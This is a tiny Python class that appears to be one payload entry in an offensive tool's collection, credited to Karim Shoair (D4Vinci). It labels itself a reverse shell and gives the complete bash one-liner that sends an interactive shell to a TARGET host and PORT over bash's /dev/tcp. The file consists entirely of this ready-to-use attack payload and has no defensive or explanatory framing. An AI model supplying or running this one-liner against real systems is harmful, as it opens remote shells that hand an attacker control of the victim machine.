class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Interactive shell via bash's builtin /dev/tcp."
    function    = "reverse shell"
    liner       = "bash -i >& /dev/tcp/TARGET/PORT 0>&1"
